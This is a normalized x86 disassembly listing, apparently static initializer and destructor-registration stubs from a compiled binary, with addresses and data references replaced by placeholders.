push 0x2800
push 0x18
push rw-data
call sub_4190b3
push sub_431300
call sub_4178d3
pop ecx
retn
sub_431110
call sub_4090e0
push j_sub_409160
call sub_4178d3
pop ecx
retn
sub_431130
push 0x0
push r--data
mov ecx rw-data
call sub_401630
push sub_431330
call sub_4178d3
pop ecx
retn
sub_431180
push 0xc
push r--data
mov ecx rw-data
call sub_408240
push sub_4313a0
call sub_4178d3
pop ecx
retn
sub_4311a0
push sub_431400
call sub_4178d3
pop ecx
retn
sub_4311ac
mov ecx rw-data
call sub_416892
push sub_43145b
call sub_4178d3
pop ecx
retn
sub_4311c2
push sub_431465
call sub_4178d3
pop ecx
retn
sub_4311ce
push sub_43146f
call sub_4178d3
pop ecx
retn
sub_4311da
push sub_431479
call sub_4178d3
pop ecx
retn
sub_4311e6
mov ecx rw-data
call sub_416892
push sub_431483
call sub_4178d3
pop ecx
retn
sub_431200
mov [ rw-data ] r--data
retn
sub_431210
mov [ rw-data ] r--data
retn
sub_431220
mov [ rw-data ] r--data
retn
sub_431300
push sub_401490
push 0x2800
push 0x18
push rw-data
call sub_41911b
retn
j_sub_409160
jmp sub_409160
j_sub_410080
jmp sub_410080
sub_43145b
mov ecx rw-data
jmp sub_4168f4
sub_431465
mov ecx rw-data
jmp sub_416993
sub_43146f
mov ecx rw-data
jmp sub_408b10
sub_431479
mov ecx rw-data
jmp sub_417065
sub_431483
mov ecx rw-data
jmp sub_4168f4
